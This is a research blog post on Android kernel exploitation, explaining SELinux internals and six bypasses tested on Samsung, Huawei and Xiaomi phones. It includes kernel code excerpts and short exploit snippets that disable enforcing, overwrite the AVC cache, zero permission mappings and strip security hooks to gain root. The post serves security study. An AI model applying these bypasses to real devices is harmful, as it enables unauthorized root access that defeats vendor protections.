> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [klecko.github.io](https://klecko.github.io/posts/selinux-bypasses/#bypass-1-disable-selinux)

> This post aims at giving an overview of what SELinux is, how it is implemented, and how to bypass it,......

This post aims at giving an overview of what SELinux is, how it is implemented, and how to bypass it, from the point of view of Android kernel exploitation.

Tests were performed on three devices: a Samsung Galaxy A34, a Huawei Mate 20 Pro, and a Xiaomi Redmi Note 12. We will focus mainly on the first two, because they have a hypervisor that will make privilege escalation and bypassing SELinux more difficult.

Code shown is from Linux kernel 5.15, with relevant notes for older versions in some cases.

What is SELinux[](#what-is-selinux)
-----------------------------------

SELinux (Security-Enhanced Linux) is a Linux kernel **security module** that implements a **Mandatory Access Control** (MAC) mechanism to enforce a given **security policy**. Let’s break this down step by step.

### Linux Security Module[](#linux-security-module)

Linux Security Modules (LSM) is a framework that allows defining modules that implement security checks. It mainly provides two things:

*   It inserts a **security** field into some critical kernel data structures. This field is an opaque `void*` pointer that is managed by the modules. Some structs that have this field are `struct task_struct`, `struct cred`, `struct inode`, `struct file`, etc.
*   It inserts calls to **hooks** at critical points in the kernel code for modules to manage the security fields and to perform access control. SELinux hooks are defined [here](https://elixir.bootlin.com/linux/v5.15.41/source/security/selinux/hooks.c#L7132).
    *   For example, [`__alloc_file()`](https://elixir.bootlin.com/linux/v5.15.41/source/fs/file_table.c#L96), which is the function responsible of allocating a `struct file`, calls [`security_file_alloc()`](https://elixir.bootlin.com/linux/v5.15.41/source/security/security.c#L1526), which first allocates the `f_security` field [here](https://elixir.bootlin.com/linux/v5.15.41/source/security/security.c#L572), and then calls the `file_alloc_security` hooks to initialize it (e.g. [`selinux_file_alloc_security()`](https://elixir.bootlin.com/linux/v5.15.41/source/security/selinux/hooks.c#L3712)).
    *   Another example: the `open` syscall ends up calling `do_dentry_open()`, which calls `security_file_open()` [here](https://elixir.bootlin.com/linux/v5.15.41/source/fs/open.c#L809). This function calls the `file_open` hooks, which are supposed to use the `f_security` field that was previously initialized to perform permission checks (e.g. [`selinux_file_open()`](https://elixir.bootlin.com/linux/v5.15.41/source/security/selinux/hooks.c#L4017)). If the check fails, the `open` syscall will return `-EACCES`.
    *   Note that there may be multiple modules, each providing its own hook functions. Modules call `security_add_hooks()` on initialization (e.g. from [`selinux_init()`](https://elixir.bootlin.com/linux/v5.15.41/source/security/selinux/hooks.c#L7430)) to add their own hooks to the global `security_hook_heads`, which contains a list of functions for each type of hook. Macros `call_void_hook()` and `call_int_hook()` are used to call hooks, and they iterate the list that corresponds to the hook and call each function.

### Mandatory Access Control[](#mandatory-access-control)

The usual permission system in Linux is **Discretionary Access Control** (DAC), where permissions rely solely on the user/group of each process, which is checked against the user, group and others permissions of each file. In addition, there’s the root user, which has permission to do everything.

In contrast, SELinux implements **Mandatory Access Control** (MAC), a more fine-grained permission system that checks permissions according to a predefined policy when doing any sensitive action with a file, socket, inode, binder object, etc. This allows giving each process only the minimum privilege level it needs to work. It also means that root access can’t do everything anymore, as it is bound to the [SELinux context](#selinux-contexts) it is using.

### SELinux policy[](#selinux-policy)

Some concepts:

*   SELinux assigns a **type** to every object (files, processes, sockets, etc). For example, by default an app has the type `untrusted_app`. For a process, its type is also known as its **domain**.
*   It’s possible to assign **attributes** to a type, making it possible to refer to all types that have an attribute.
*   Objects are also mapped to **classes**, which indicates if they are a file, a process, a directory, etc.

**SELinux contexts** or **labels** have the format `user:role:type:sensitivity[:categories]`, with the type being the most important part. When running `id` from `adb shell`, it will show our context as `u:r:shell:s0`. However, when doing it from an app, it will show something like `u:r:untrusted_app:s0:c15,c256,c513,c768`. This determines our permissions. Files also have a label associated with them, and they can be printed if we add the `-Z` option to `ls`:

```
$ ls -lZ /dev/mali0
crw-rw-rw- 1 system system u:object_r:gpu_device:s0 10, 114 2024-09-19 19:50 /dev/mali0
```

SELinux hook functions check the requested permission against a **policy**. This policy defines what resources each process can access. It is made of **rules**, which come in the form: `allow source target:class permissions;`, where _source_ and _target_ are types or attributes. Here’s an example of a rule from a real device:

```
allow untrusted_app gpu_device:chr_file { append getattr ioctl lock map open read write };
```

This rule says that processes with domain `untrusted_app` (which is the default for an Android app) can open, read, write, map, and perform ioctl on files of type `gpu_device`, such as the `/dev/mali0` file above, which is the character device for interacting with the Mali GPU driver. Note that by default, everything is denied unless there’s a rule that allows it.

Android SELinux policy is defined in the [`system/sepolicy`](https://android.googlesource.com/platform/system/sepolicy/+/main) repository and compiled to a binary file, which can be accessed in the device at `/sys/fs/selinux/policy`. That policy file can be easily inspected from the host. For example, to list everything accessible from untrusted app context:

```
$ adb pull /sys/fs/selinux/policy policy
/sys/fs/selinux/policy: 1 file pulled, 0 skipped. 23.0 MB/s (1033355 bytes in 0.043s)
$ sesearch ./policy --allow -s untrusted_app
...
allow untrusted_app gpu_device:chr_file { append getattr ioctl lock map open read write };
...
```

### Example denial[](#example-denial)

The following is an example of what is logged to logcat when trying to do some action for which we don’t have permission. In this case, my exploit had successfully replaced my process creds with `init_cred`, and I was ready to drop a root shell. However, despite being root user with all capabilities, I was not allowed to execute `/system/bin/sh`. As the log message says, a process with context of type `kernel` (the one assigned to `init_cred`) is not allowed to execute a file with context of type `shell_exec`.

> `12487 12487 W /data/local/tmp/exploit: type=1400 audit(0.0:1975): avc: denied { execute } for comm=exploit ino=9289095 scontext=u:r:kernel:s0 tcontext=u:object_r:shell_exec:s0 tclass=file permissive=0`

Therefore, a SELinux bypass is needed to get unrestricted root access to the device.

Implementation overview[](#implementation-overview)
---------------------------------------------------

SELinux permission checks are done in `avc_has_perm_noaudit()`. Every permission check hook ends up calling this function with a pointer to the global `selinux_state` as first argument. This function checks whether permissions `requested` are granted for an object of type `ssid` operating on an object of type `tsid` and class `tclass`, and stores the result in `avd`. Let’s see how it is implemented.

```
inline int avc_has_perm_noaudit(struct selinux_state *state,
				u32 ssid, u32 tsid,
				u16 tclass, u32 requested,
				unsigned int flags,
				struct av_decision *avd)
{
	struct avc_node *node;
	struct avc_xperms_node xp_node;
	int rc = 0;
	u32 denied;

	if (WARN_ON(!requested))
		return -EACCES;

	rcu_read_lock();

	node = avc_lookup(state->avc, ssid, tsid, tclass);
	if (unlikely(!node))
		node = avc_compute_av(state, ssid, tsid, tclass, avd, &xp_node);
	else
		memcpy(avd, &node->ae.avd, sizeof(*avd));

	denied = requested & ~(avd->allowed);
	if (unlikely(denied))
		rc = avc_denied(state, ssid, tsid, tclass, requested, 0, 0,
				flags, avd);

	rcu_read_unlock();
	return rc;
}

static noinline
struct avc_node *avc_compute_av(struct selinux_state *state,
				u32 ssid, u32 tsid,
				u16 tclass, struct av_decision *avd,
				struct avc_xperms_node *xp_node)
{
	rcu_read_unlock();
	INIT_LIST_HEAD(&xp_node->xpd_head);
	security_compute_av(state, ssid, tsid, tclass, avd, &xp_node->xp);
	rcu_read_lock();
	return avc_insert(state->avc, ssid, tsid, tclass, avd, xp_node);
}
```

First, it calls `avc_lookup()` to check if that permission check has been computed before and is in the cache. If not, it calls `avc_compute_av()`, which computes the permission check with `security_compute_av()` and then inserts it into the cache with `avc_insert()`. Finally, if the permission request is denied, it returns the result of `avc_denied()`, which can be 0 (granted) or `-EACCES` (denied).

Bypasses[](#bypasses)
---------------------

Let’s explore different bypasses from an exploit development perspective, assuming an arbitrary write memory primitive. Some notes about why each bypass works or doesn’t work on my devices are included.

Code above shows three different ways to attack SELinux: we can attack the cache (`avc_lookup()`), we can attack the permission computation (`security_compute_av()`), or we can attack `avc_denied()`, which may allow the action even if the permission check was denied.

### Bypass 1: Disable SELinux[](#bypass-1-disable-selinux)

If we inspect the code of `avc_denied()`, which is called when a permission check has failed, we can see it can still return 0 instead of `-EACCES` if `state->enforcing` is false.

```
static noinline int avc_denied(struct selinux_state *state,
			       u32 ssid, u32 tsid,
			       u16 tclass, u32 requested,
			       u8 driver, u8 xperm, unsigned int flags,
			       struct av_decision *avd)
{
	if (flags & AVC_STRICT)
		return -EACCES;

	if (enforcing_enabled(state) &&
	    !(avd->flags & AVD_FLAGS_PERMISSIVE))
		return -EACCES;

	avc_update_node(state->avc, AVC_CALLBACK_GRANT, requested, driver,
			xperm, ssid, tsid, tclass, avd->seqno, NULL, flags);
	return 0;
}

static inline bool enforcing_enabled(struct selinux_state *state)
{
	return READ_ONCE(state->enforcing);
}
```

Therefore, the simplest way to bypass SELinux would be to set `state->enforcing` to false. This sets SELinux to permissive state, in which permission denials are logged but not enforced.

In Linux 5.15, the definition of `struct selinux_state` is as follows:

```
struct selinux_state {
#ifdef CONFIG_SECURITY_SELINUX_DISABLE
	bool disabled;
#endif
#ifdef CONFIG_SECURITY_SELINUX_DEVELOP
	bool enforcing;
#endif
	bool checkreqprot;
	bool initialized;
	bool policycap[__POLICYDB_CAPABILITY_MAX];

	struct page *status_page;
	struct mutex status_lock;

	struct selinux_avc *avc;
	struct selinux_policy __rcu *policy;
	struct mutex policy_mutex;
} __randomize_layout;
```

`CONFIG_SECURITY_SELINUX_DISABLE` is usually not enabled while `CONFIG_SECURITY_SELINUX_DEVELOP` is, so `enforcing` is at offset 0. Therefore, this bypass would be:

```
kwrite8(selinux_state_addr, 0);
```

> On newer Linux versions (6.6), the `disabled` field in `selinux_state` has been completely removed. On older versions (4.19, 5.4), instead, the `disabled` field was always present, so the `enforcing` field would be at offset 1. On even older versions (4.14), there was no `selinux_state`, and its `enforcing` field corresponded to the global `selinux_enforcing`.

You may wonder why we need more bypasses if this just works. The reason is that manufacturers like Samsung or Huawei are building hypervisors that run at higher privilege than the kernel and that try to block privilege escalation attempts by protecting critical kernel memory and marking it as read-only. This includes the SELinux state global variables. On other devices, `CONFIG_SECURITY_SELINUX_DEVELOP` is disabled, so the `enforcing` field is removed and SELinux can’t actually be set to permissive state.

> In my Samsung device, `selinux_enforcing` is protected by the [hypervisor](https://blog.longterm.io/samsung_rkp.html#protecting-kernel-data), so we can’t write to it.
> 
> ```
> int selinux_enforcing __kdp_ro_aligned;
> ```
> 
> My Huawei device, on the other hand, doesn’t define `CONFIG_SECURITY_SELINUX_DEVELOP`, and thus defines `selinux_enforcing` as 1.
> 
> ```
> #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
> extern int selinux_enforcing;
> #else
> #define selinux_enforcing 1
> #endif
> ```

### Bypass 2: Overwrite permissive map[](#bypass-2-overwrite-permissive-map)

If we take a look at the code of `avc_denied()` shown before, it also returns 0 if `avd->flags & AVD_FLAGS_PERMISSIVE`. This `avd` is populated in `security_compute_av()`, and that flag is added if the bit in `policydb->permissive_map` corresponding to the source type is set:

```
void security_compute_av([...], struct av_decision *avd, [...]) {
	[...]
	/* permissive domain? */
	if (ebitmap_get_bit(&policydb->permissive_map, scontext->type))
		avd->flags |= AVD_FLAGS_PERMISSIVE;
	[...]
}
```

Therefore, if we overwrite this `permissive_map` and set all bits, the effect would be similar to setting SELinux to permissive mode.

> However, Samsung and Huawei devices present some problems with this approach:
> 
> *   On my Samsung device, `AVD_FLAGS_PERMISSIVE` is defined as 0, so it is ignored.
> *   On my Huawei device, `permissive_map` is allocated from [selinux_pool](https://blog.impalabs.com/2212_huawei-security-hypervisor.html#selinux-protection), a memory pool that is made read-only from the hypervisor after loading the security policy, so we can’t overwrite it.

### Bypass 3: Overwrite AVC cache[](#bypass-3-overwrite-avc-cache)

Function `avc_has_perm_noaudit()` calls `avc_lookup()` to check if that permission check has been computed before and is in the cache, which ends up calling `avc_search_node()`. The returned node, if found, would indicate the allowed permissions for an object of type `ssid` operating of an object of type `tsid` and class `tclass`.

```
static inline struct avc_node *avc_search_node(struct selinux_avc *avc,
					       u32 ssid, u32 tsid, u16 tclass)
{
	struct avc_node *node, *ret = NULL;
	int hvalue;
	struct hlist_head *head;

	hvalue = avc_hash(ssid, tsid, tclass);
	head = &avc->avc_cache.slots[hvalue];
	hlist_for_each_entry_rcu(node, head, list) {
		if (ssid == node->ae.ssid &&
		    tclass == node->ae.tclass &&
		    tsid == node->ae.tsid) {
			ret = node;
			break;
		}
	}

	return ret;
}
```

As can be seen, the `avc_cache` has a hash table of `avc_node`s. It first calculates the slot or bucket by hashing the `ssid`, `tsid` and `tclass` together, and then iterates that slot looking for the exact match. From the returned node, what is interesting to us is the field `node->ae.avd.allowed`, whose bits indicate which permissions are allowed. If we iterate every node in the `avc_cache` and overwrite that field with `0xFFFFFFFF`, every permission check that was previously cached would now succeed.

```
struct avc_cache {
	struct hlist_head	slots[AVC_CACHE_SLOTS]; /* head for avc_node->list */
	[...]
};

struct avc_node {
	struct avc_entry	ae;
	struct hlist_node	list; /* anchored in avc_cache->slots[i] */
	[...]
};

struct avc_entry {
	u32			ssid;
	u32			tsid;
	u16			tclass;
	struct av_decision	avd;
	struct avc_xperms_node	*xp_node;
};
```

```
struct av_decision {
	u32 allowed;
	u32 auditallow;
	u32 auditdeny;
	u32 seqno;
	u32 flags;
};
```

Therefore, the bypass would look something like this:

```
#define AVC_CACHE_SLOTS 512
#define AVC_DECISION_ALLOWALL 0xffffffff

void overwrite_avc_cache(uint64_t avc_cache_addr) {
	for (size_t i = 0; i < AVC_CACHE_SLOTS; i++) {
		uint64_t avc_cache_slot_list = kread64(avc_cache_addr + i*sizeof(uint64_t));
		while (avc_cache_slot_list) {
			uint64_t avc_decision_addr = avc_cache_slot_list - 0x1c;
			kwrite32(avc_decision_addr, AVC_DECISION_ALLOWALL);
			avc_cache_slot_list = kread64(avc_cache_slot_list);
		}
	}
}
```

The `avc_cache` is embedded inside the global `selinux_avc`, alongside `avc_cache_threshold`.

```
struct selinux_avc {
	unsigned int avc_cache_threshold;
	struct avc_cache avc_cache;
};

static struct selinux_avc selinux_avc;
```

This `avc_cache_threshold` is used in `avc_alloc_node()` to determine if the AVC cache should be trimmed.

```
static struct avc_node *avc_alloc_node(struct selinux_avc *avc)
{
	struct avc_node *node;
	[...]
	if (atomic_inc_return(&avc->avc_cache.active_nodes) >
	    avc->avc_cache_threshold)
		avc_reclaim_node(avc);
out:
	return node;
}
```

If we don’t want the modified nodes to be ever removed from the cache, we can write `0xFFFFFFFF` to that field.

> On older Linux versions (4.14), the AVC cache and its threshold are defined as global variables `avc_cache` and `avc_cache_threshold`, instead of being embedded into global `selinux_avc`.

Note that this only modifies permission checks that have been already computed and cached. Therefore, we can’t just allow everything by default. Instead, the workflow would be to perform some action for which we don’t have permission, let it fail, overwrite the AVC cache, and then perform it again, this time succeeding.

This bypass was used [here](https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/selinux_bypass.c#L446) by chompie1337. She implemented the aforementioned workflow in order to load a new SELinux policy. Therefore, she only needed to overwrite the AVC cache at most twice (to `open` and `write` on `/sys/fs/selinux/load`). After that, the injected SELinux policy takes effect, which can contain rules to allow any action.

> This doesn’t work on my Huawei device. As noted [here](https://blog.impalabs.com/2212_huawei-security-hypervisor.html#selinux-protection), SELinux data structures are allocated from a memory pool that is later made read-only, making loading a new policy impossible. The AVC cache is not allocated from that memory pool, so it can still be overwritten. But without any other more consistent mechanism to disable SELinux, this is pretty much useless. I have not tested policy reloading on my Samsung device.

### Bypass 4: SELinux initialization[](#bypass-4-selinux-initialization)

Let’s check the implementation of `security_compute_av()`, the function in charge of actually computing a permission check in case it wasn’t in the cache.

```
void security_compute_av(struct selinux_state *state,
			 u32 ssid,
			 u32 tsid,
			 u16 orig_tclass,
			 struct av_decision *avd,
			 struct extended_perms *xperms)
{
	[...]
	if (!selinux_initialized(state))
		goto allow;
	[...]

allow:
	avd->allowed = 0xffffffff;
	goto out;
}
```

```
static inline bool selinux_initialized(const struct selinux_state *state)
{
	/* do a synchronized load to avoid race conditions */
	return smp_load_acquire(&state->initialized);
}
```

We can see that if `state->initialized` is not set, it allows every permission request. This field indicates if SELinux has been initialized and a policy has been loaded. It is set by `security_policy_commit()`, which is called by `sel_write_load()`, the write handler of `/sys/fs/selinux/load`.

If we have a memory write primitive, we can set `state->initialized` to false, bypassing every SELinux permission check. However, this leaves the system in an unstable state, because that field is checked in many other places, and setting it to false causes many features to not work. Therefore, it should be restored as soon as possible. [Here](https://www.blackhat.com/docs/us-17/thursday/us-17-Shen-Defeating-Samsung-KNOX-With-Zero-Privilege-wp.pdf), similar to previous bypass, they use this to load a new policy, which already sets `state->initialized`.

Also, note that we are targeting `security_compute_av()`, and that function may not be called if the permission check is found in the cache. Therefore, it may also be needed to [overwrite the cache](#bypass-3-overwrite-avc-cache).

> On older Linux versions (4.14), field `state->initialized` corresponded to the global `ss_initialized`.

> This doesn’t work on my Samsung device because `ss_initialized` is protected by the [hypervisor](https://blog.longterm.io/samsung_rkp.html#selinux-initialization).
> 
> ```
> #if (defined CONFIG_KDP_CRED && defined CONFIG_SAMSUNG_PRODUCT_SHIP)
> int ss_initialized __kdp_ro_aligned;
> #else
> int ss_initialized;
> #endif
> ```
> 
> Similarly, on my Huawei device that variable is also protected by the [hypervisor](https://blog.impalabs.com/2212_huawei-security-hypervisor.html#selinux-protection).
> 
> ```
> #ifdef CONFIG_HKIP_SELINUX_PROT
> int ss_initialized __wr;
> #else
> int ss_initialized;
> #endif
> ```

### Bypass 5: Overwrite mapping[](#bypass-5-overwrite-mapping)

Function `security_compute_av()` calls `map_decision()`:

```
void security_compute_av(struct selinux_state *state,
			 u32 ssid,
			 u32 tsid,
			 u16 orig_tclass,
			 struct av_decision *avd,
			 struct extended_perms *xperms)
{
	struct selinux_policy *policy;
	struct policydb *policydb;
	[...]

	rcu_read_lock();
	policy = rcu_dereference(state->policy);
	[...]
	policydb = &policy->policydb;
	[...]

	map_decision(&policy->map, orig_tclass, avd,
		     policydb->allow_unknown);
out:
	rcu_read_unlock();
	return;
	[...]
}
```

And as we can see in the following code, if `allow_unknown` is true and `mapping->perms[i]` is 0, then it sets that bit in `avd->allowed`, allowing that permission.

```
static void map_decision(struct selinux_map *map,
			 u16 tclass, struct av_decision *avd,
			 int allow_unknown)
{
	if (tclass < map->size) {
		struct selinux_mapping *mapping = &map->mapping[tclass];
		unsigned int i, n = mapping->num_perms;
		u32 result;

		for (i = 0, result = 0; i < n; i++) {
			if (avd->allowed & mapping->perms[i])
				result |= 1<<i;
			if (allow_unknown && !mapping->perms[i]) // <--------
				result |= 1<<i;
		}
		avd->allowed = result;
		[...]
	}
}
```

We can abuse this to bypass SELinux by setting `policydb->allow_unknown` to true and filling `map.mapping[tclass].perms` with zeroes.

In Linux kernel 5.15, the `selinux_map`, which contains both the dynamically allocated array `mapping` indexed by class and its size, is at `&selinux_state.policy->map`, and the `allow_unknown` is at `&selinux_state.policy->policydb.allow_unknown`.

```
/* Mapping for a single class */
struct selinux_mapping {
	u16 value; /* policy value for class */
	unsigned int num_perms; /* number of permissions in class */
	u32 perms[sizeof(u32) * 8]; /* policy values for permissions */
};

/* Map for all of the classes, with array size */
struct selinux_map {
	struct selinux_mapping *mapping; /* indexed by class */
	u16 size; /* array size of mapping */
};

struct selinux_policy {
	struct sidtab *sidtab;
	struct policydb policydb;
	struct selinux_map map;
	u32 latest_granting;
} __randomize_layout;
```

> On older versions (4.19), `policydb` and `map` were both embedded in a global variable `selinux_ss`. On even older versions (4.14), `policydb` was a global variable, and `map` corresponded to global variables `current_mapping` and `current_mapping_size`.

Therefore, the bypass for 4.14 would look something like this:

```
// Set policydb.allow_unknown to true
kwrite8(policydb_addr + OFFSET_ALLOW_UNKNOWN, 2);

// Overwrite mapping so everything is unknown
uint64_t current_mapping_size = kread16(current_mapping_size_addr);
uint64_t current_mapping = kread64(current_mapping_addr);
uint8_t zeroes[FIELD_SIZEOF(struct selinux_mapping, perms)] = {};
for (size_t tclass = 0; tclass < current_mapping_size; tclass++) {
	uint64_t mapping = current_mapping + tclass*sizeof(struct selinux_mapping);
	kwrite(mapping + offsetof(struct selinux_mapping, perms),
	       zeroes, sizeof(zeroes));
}
```

The mapping is only modified when loading a new policy, so if we don’t reload the policy, we only need to do this once. But note that like the previous bypass, this targets `security_compute_av()`, and thus additionally it may be needed to [overwrite the AVC cache](#bypass-3-overwrite-avc-cache) to remove cached denied permission requests.

This bypass was presented at [Game of Cross Cache: Let’s Win It in a More Effective Way!](https://www.blackhat.com/asia-24/briefings/schedule/#game-of-cross-cache-lets-win-it-in-a-more-effective-way-37742) (slide 88) at Blackhat Asia 2024.

> This works on both my Samsung and my Huawei device. The memory of the mapping was not protected on either device.

### Bypass 6: Remove hooks[](#bypass-6-remove-hooks)

In [this post](https://www.iceswordlab.com/2018/04/20/samsung-root/#0x4-KNOX2-8-amp-amp-SELinux-%E5%9B%9E%E9%A1%B5%E9%A6%96), they bypass both SELinux and Samsung RKP (the Samsung hypervisor) by removing the security hooks. As explained [previously](#linux-security-module), SELinux hooks are added to the global `security_hook_heads`. This structure is defined as follows:

```
struct security_hook_heads {
	#define LSM_HOOK(RET, DEFAULT, NAME, ...) struct hlist_head NAME;
	#include "lsm_hook_defs.h"
	#undef LSM_HOOK
} __randomize_layout;
```

```
LSM_HOOK(int, 0, file_alloc_security, struct file *file)
LSM_HOOK(int, 0, file_open, struct file *file)
[...]
```

It includes the `lsm_hook_defs.h`, which in this case defines a `struct hlist_head` for each type of hook.

> On older Linux versions (4.14), `security_hook_heads` defined a `struct list_head` instead of a `struct hlist_head` for each type of hook. So each hook list head took 16 bytes instead of 8.

Modules call `security_add_hooks()` to add their own hook functions to each list. Therefore, if we could modify the global `security_hook_heads` and its lists, it may be possible to remove hooks to bypass SELinux.

There is one problem: this structure is declared as `__lsm_ro_after_init`, which means it is marked as read-only after init. A regular memory write primitive won’t work.

```
struct security_hook_heads security_hook_heads __lsm_ro_after_init;
```

However, if there is no hypervisor, there are ways to write to read-only memory. First, if we have a physical memory write primitive we can just write to it, as it writes to the underlying physical memory, ignoring virtual memory protections. Otherwise, if we have a virtual memory write primitive, we could modify the protections of that page by modifying the kernel page table (`swapper_pg_dir`), or maybe map that page to another virtual address with read-write permissions.

On the other side, if there is a hypervisor underneath, it may not be possible to write to read-only memory from the kernel. This is because the physical address obtained from the kernel page tables is actually an Intermediate Physical Address (IPA), which may be mapped to the real physical address as read-only in the second stage page tables in the hypervisor, as explained [here](https://blog.impalabs.com/2212_huawei-security-hypervisor.html#arm-virtualization-extensions) and [here](https://blog.longterm.io/samsung_rkp.html#hypervisor-crash-course).

> Truth is, I have managed to write to `security_hook_heads` on both my Samsung and Huawei devices, which supposedly protect read-only memory from the hypervisor. On my Samsung device, I believe it is because they don’t protect “read-only after init” memory, as they don’t do any call to the hypervisor from `mark_rodata_ro()`, the function in charge of changing permissions of `__ro_after_init` memory to read-only. On my Huawei device, they did modify `mark_rodata_ro()` to perform hypercalls to also mark that memory as read-only in the second stage page tables, as shown [here](https://blog.impalabs.com/2212_huawei-security-hypervisor.html#kernel-read-only-data). However, I believe the memory write primitive I was using in my test exploit bypasses this because memory access is performed from the GPU, instead of from the CPU. This may have been patched on more modern devices.

Even when we can write to read-only memory, one must be careful when modifying `security_hook_heads`. Just emptying every list and removing every hook didn’t work for me. It crashed with some NULL point deref because of a hook accessing a NULL `security` field. However, I believe by removing the correct hooks, it’s possible to get a stable SELinux bypass, as the post explains.

Note this can also be used to perform privilege escalation. Syscall `setresuid()` checks permissions with [`ns_capable_setid()`](https://elixir.bootlin.com/linux/v5.15.41/source/kernel/sys.c#L680), which ends up calling `security_capable()`, which simply calls the hook `capable`. So if we empty the list `security_hook_heads.capable`, then those permission checks won’t be performed, and we can just do `setresuid(0, 0, 0)` to get root. Something similar is implemented [here](https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/dac_bypass.c) by chompie1337.

> In theory, this shouldn’t work on my Samsung and Huawei devices, because they have some methods to detect privilege escalations and abort them. However, my Huawei device fails to detect this privilege escalation. I believe this is because, as shown [here](https://blog.impalabs.com/2212_huawei-security-hypervisor.html#privilege-escalation-detection), it stores a protected bitmap indicating if each process is root or not. Then, at certain points, it calls `hkip_check_xid_root()` to check if the task is now root but wasn’t before according to the bitmap, and kills it in that case. However, that bitmap is updated with `hkip_update_xid_root()` from `commit_creds()`, which is [called](https://elixir.bootlin.com/linux/v5.15.41/source/kernel/sys.c#L715) from syscall `setresuid()`. So if we manage to bypass the permission checks present by default in that syscall as we are doing by overwriting `security_hook_heads.capable`, then the hypervisor will happily update the bitmap and allow the privilege escalation. Similarly, this privilege escalation method also worked on my Samsung device, but I didn’t further explore the reasons why Samsung DEFEX failed.

Conclusion[](#conclusion)
-------------------------

I hope you enjoyed the post and learnt something new. Please don’t hesitate to contact me if you see something wrong or for any question or clarification. Happy hacking!

References[](#references)
-------------------------

1.  [Linux Security Modules](https://docs.kernel.org/security/lsm.html#lsm-framework)
2.  [SELinux types, attributes and rules](https://source.android.com/docs/security/features/selinux/concepts#types_attributes_rules)
3.  [SELinux protection on Huawei devices (from Shedding Light on Huawei’s Security Hypervisor, by Impalabs)](https://blog.impalabs.com/2212_huawei-security-hypervisor.html#selinux-protection)
4.  [SELinux protection on Samsung devices (from A Samsung RKP Compendium, by Longterm Security)](https://blog.longterm.io/samsung_rkp.html#selinux-initialization)
5.  [Samsung KNOX and SELinux (from How to root Samsung S8 using a race vulnerability, by IceSword Lab)](https://www.iceswordlab.com/2018/04/20/samsung-root/#0x4-KNOX2-8-amp-amp-SELinux-%E5%9B%9E%E9%A1%B5%E9%A6%96)
6.  [Defeating Samsung KNOX with zero privilege (by Keen Security Lab)](https://www.blackhat.com/docs/us-17/thursday/us-17-Shen-Defeating-Samsung-KNOX-With-Zero-Privilege-wp.pdf)